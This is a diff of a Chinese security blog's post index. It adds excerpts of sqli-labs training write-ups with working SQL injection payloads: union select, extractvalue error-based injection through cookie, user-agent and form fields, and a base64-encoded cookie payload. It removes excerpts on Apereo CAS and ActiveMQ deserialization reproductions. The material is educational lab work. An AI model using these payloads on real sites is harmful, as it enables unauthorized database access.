@@ -295,6 +295,485 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://hzktester.top/2020/10/20/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess23%EF%BC%88%E8%BF%87%E6%BB%A4%E4%BA%86%E6%B3%A8%E9%87%8A%E7%AC%A6%E7%9A%84%E7%BB%95%E8%BF%87%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="hzktester">
+      <meta itemprop="description" content="偷偷努力，然后惊艳所有人">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hzktester`s Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/10/20/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess23%EF%BC%88%E8%BF%87%E6%BB%A4%E4%BA%86%E6%B3%A8%E9%87%8A%E7%AC%A6%E7%9A%84%E7%BB%95%E8%BF%87%EF%BC%89/" class="post-title-link" itemprop="url">sqli-labs靶场Less23（过滤了注释符的绕过）</a>
+        </h2>
+
+        <div class="post-meta">
+			
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-10-20 15:48:00 / 修改时间：15:49:45" itemprop="dateCreated datePublished" datetime="2020-10-20T15:48:00+08:00">2020-10-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/sqli-labs%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">sqli-labs靶场</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>85</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="Less23"><a href="#Less23" class="headerlink" title="Less23"></a>Less23</h2><p>本关对<code>id</code>参数过滤了<code>#</code>和<code>--</code>的处理。但是还可以使用闭合的方式来注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,@@datadir,&#39;3</span><br></pre></td></tr></table></figure>
+<p><img src="https://qiniu.hzktester.top/tp2020102009.png" alt="image"></p>
+
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/10/20/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess23%EF%BC%88%E8%BF%87%E6%BB%A4%E4%BA%86%E6%B3%A8%E9%87%8A%E7%AC%A6%E7%9A%84%E7%BB%95%E8%BF%87%EF%BC%89/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://hzktester.top/2020/10/20/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess20%E3%80%8121%E3%80%8122(cookie%E6%B3%A8%E5%85%A5)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="hzktester">
+      <meta itemprop="description" content="偷偷努力，然后惊艳所有人">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hzktester`s Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/10/20/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess20%E3%80%8121%E3%80%8122(cookie%E6%B3%A8%E5%85%A5)/" class="post-title-link" itemprop="url">sqli-labs靶场Less20、21、22(cookie注入)</a>
+        </h2>
+
+        <div class="post-meta">
+			
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-10-20 14:59:00 / 修改时间：14:59:56" itemprop="dateCreated datePublished" datetime="2020-10-20T14:59:00+08:00">2020-10-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/sqli-labs%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">sqli-labs靶场</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>683</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="Less20"><a href="#Less20" class="headerlink" title="Less20"></a>Less20</h2><p>从源代码中我们可以看到 <code>cookie</code> 从 <code>username</code> 中获得值后，当再次刷新时，会从 <code>cookie</code> 中读<br>取 <code>username</code>，然后进行查询。<br>登录成功后，我们修改 <code>cookie</code>，再次刷新时，这时候 <code>sql</code> 语句就会被修改了</p>
+<p>先使用正确的账号密码登录一次。使用burp抓取第二个数据包。修改<code>cookie</code>的值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#</span><br></pre></td></tr></table></figure>
+<p><img src="https://qiniu.hzktester.top/tp2020102006.png" alt="image"></p>
+<h2 id="Less21"><a href="#Less21" class="headerlink" title="Less21"></a>Less21</h2><p>与Less20处理流程一样，但是对cookie进行了<code>base64</code>加密。利用Less20的方法，但是需要将<code>payload</code>进行<code>base64</code>编码处理（这里对uname进行了<code>(&#39;uname&#39;)</code>处理）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4nKWFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IEBAYmFzZWRpciksMHg3ZSkpIw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+<p><img src="https://qiniu.hzktester.top/tp2020102007.png" alt="image"></p>
+<h2 id="Less22"><a href="#Less22" class="headerlink" title="Less22"></a>Less22</h2>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/10/20/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess20%E3%80%8121%E3%80%8122(cookie%E6%B3%A8%E5%85%A5)/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://hzktester.top/2020/10/20/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess19(referer%E6%B3%A8%E5%85%A5)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="hzktester">
+      <meta itemprop="description" content="偷偷努力，然后惊艳所有人">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hzktester`s Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/10/20/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess19(referer%E6%B3%A8%E5%85%A5)/" class="post-title-link" itemprop="url">sqli-labs靶场Less-19(referer注入)</a>
+        </h2>
+
+        <div class="post-meta">
+			
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-10-20 14:34:00 / 修改时间：14:34:49" itemprop="dateCreated datePublished" datetime="2020-10-20T14:34:00+08:00">2020-10-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/sqli-labs%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">sqli-labs靶场</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>55</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="Less19"><a href="#Less19" class="headerlink" title="Less19"></a>Less19</h2><p>本关和Less18基本是一致的，只不过是<code>referer</code>处存在注入</p>
+<p>使用burp抓包修改<code>referer</code></p>
+<p><img src="https://qiniu.hzktester.top/tp2020102005.png" alt="image"></p>
+
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/10/20/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess19(referer%E6%B3%A8%E5%85%A5)/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://hzktester.top/2020/10/20/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess18(useragent%E6%B3%A8%E5%85%A5)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="hzktester">
+      <meta itemprop="description" content="偷偷努力，然后惊艳所有人">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hzktester`s Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/10/20/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess18(useragent%E6%B3%A8%E5%85%A5)/" class="post-title-link" itemprop="url">sqli-labs靶场Less-18(useragent注入)</a>
+        </h2>
+
+        <div class="post-meta">
+			
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-10-20 14:23:00 / 修改时间：14:24:10" itemprop="dateCreated datePublished" datetime="2020-10-20T14:23:00+08:00">2020-10-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/sqli-labs%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">sqli-labs靶场</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>491</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="Less18"><a href="#Less18" class="headerlink" title="Less18"></a>Less18</h2><p>本关可以从源码了解到对<code>uname</code>和<code>passwd</code>进行了<code>check_input()</code>函数的处理，所以这里无法注入了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uname &#x3D; check_input($_POST[&#39;uname&#39;]);</span><br><span class="line">$passwd &#x3D; check_input($_POST[&#39;passwd&#39;]);</span><br></pre></td></tr></table></figure>
+<p>但是代码中将<code>useragent</code>和<code>ip</code>插入到数据库中，可以使用<code>useragent</code>进行注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO &#96;security&#96;.&#96;uagents&#96; (&#96;uagent&#96;, &#96;ip_address&#96;, &#96;username&#96;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)</span><br></pre></td></tr></table></figure>
+<p>使用burp抓包修改<code>useragent</code>看看</p>
+<p><img src="https://qiniu.hzktester.top/tp2020102003.png" alt="image"></p>
+<p>修改<code>useragent</code>报错注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+<p><img src="https://qiniu.hzktester.top/tp2020102004.png" alt="image"></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/10/20/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess18(useragent%E6%B3%A8%E5%85%A5)/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://hzktester.top/2020/10/20/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess17(update%E6%B3%A8%E5%85%A5)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="hzktester">
+      <meta itemprop="description" content="偷偷努力，然后惊艳所有人">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hzktester`s Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/10/20/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess17(update%E6%B3%A8%E5%85%A5)/" class="post-title-link" itemprop="url">sqli-labs靶场Less-17(update注入)</a>
+        </h2>
+
+        <div class="post-meta">
+			
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-10-20 11:27:00 / 修改时间：14:23:10" itemprop="dateCreated datePublished" datetime="2020-10-20T11:27:00+08:00">2020-10-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/sqli-labs%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">sqli-labs靶场</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>259</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="Less17"><a href="#Less17" class="headerlink" title="Less17"></a>Less17</h2><p>本关可以看到是一个修改密码的过程，利用的是<code>update</code>语句，与再用<code>select</code>时是一样的。</p>
+<p>尝试报错：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;11&#39;&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
+<p>可以看到<code>sql</code>语句报错</p>
+<p><img src="https://qiniu.hzktester.top/tp2020102001.png" alt="image"></p>
+<p>尝试一下报错注入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;11&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
+<p><img src="https://qiniu.hzktester.top/tp2020102002.png" alt="image"></p>
+
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/10/20/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess17(update%E6%B3%A8%E5%85%A5)/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://hzktester.top/2020/10/15/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -966,523 +1445,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://hzktester.top/2020/10/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apereo%20CAS%204.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="hzktester">
-      <meta itemprop="description" content="偷偷努力，然后惊艳所有人">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hzktester`s Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/10/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apereo%20CAS%204.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">Apereo CAS 4.1 反序列化命令执行漏洞</a>
-        </h2>
-
-        <div class="post-meta">
-			
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-10-10 11:40:00" itemprop="dateCreated datePublished" datetime="2020-10-10T11:40:00+08:00">2020-10-10</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-19 21:02:44" itemprop="dateModified" datetime="2020-10-19T21:02:44+08:00">2020-10-19</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>2.2k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p><code>Apereo CAS</code>是一款<code>Apereo</code>发布的集中认证服务平台，常被用于企业内部单点登录系统。其4.1.7版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用<code>vulhub</code>启动漏洞环境</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;root&#x2F;vulhub&#x2F;apereo-cas&#x2F;4.1-rce&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-<p>环境启动后，访问<code>http://your-ip:8080/cas/login</code>即可查看到登录页面。</p>
-<p><img src="https://qiniu.hzktester.top/tp2020101009.png" alt="image"></p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞原理是<code>Webflow</code>中使用了默认密钥<code>changeit</code>：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class EncryptedTranscoder implements Transcoder &#123;</span><br><span class="line">    private CipherBean cipherBean;</span><br><span class="line">    private boolean compression &#x3D; true;</span><br><span class="line"></span><br><span class="line">    public EncryptedTranscoder() throws IOException &#123;</span><br><span class="line">        BufferedBlockCipherBean bufferedBlockCipherBean &#x3D; new BufferedBlockCipherBean();</span><br><span class="line">        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec(&quot;AES&quot;, &quot;CBC&quot;, &quot;PKCS7&quot;));</span><br><span class="line">        bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());</span><br><span class="line">        bufferedBlockCipherBean.setKeyAlias(&quot;aes128&quot;);</span><br><span class="line">        bufferedBlockCipherBean.setKeyPassword(&quot;changeit&quot;);</span><br><span class="line">        bufferedBlockCipherBean.setNonce(new RBGNonce());</span><br><span class="line">        this.setCipherBean(bufferedBlockCipherBean);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; ...</span><br></pre></td></tr></table></figure>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/10/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apereo%20CAS%204.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://hzktester.top/2020/10/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-5254%EF%BC%89/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="hzktester">
-      <meta itemprop="description" content="偷偷努力，然后惊艳所有人">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hzktester`s Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/10/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-5254%EF%BC%89/" class="post-title-link" itemprop="url">ActiveMQ 反序列化漏洞（CVE-2015-5254）</a>
-        </h2>
-
-        <div class="post-meta">
-			
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-10-10 10:32:00" itemprop="dateCreated datePublished" datetime="2020-10-10T10:32:00+08:00">2020-10-10</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-19 21:02:36" itemprop="dateModified" datetime="2020-10-19T21:02:36+08:00">2020-10-19</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.3k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p><code>Apache ActiveMQ</code>是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持<code>Java</code>消息服务、集群、<code>Spring Framework</code>等。</p>
-<p><code>Apache ActiveMQ 5.13.0</code>之前<code>5.x</code>版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的<code>Java Message Service(JMS)ObjectMessage</code>对象利用该漏洞执行任意代码。</p>
-<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>使用<code>vulhub</code>运行漏洞环境</p>
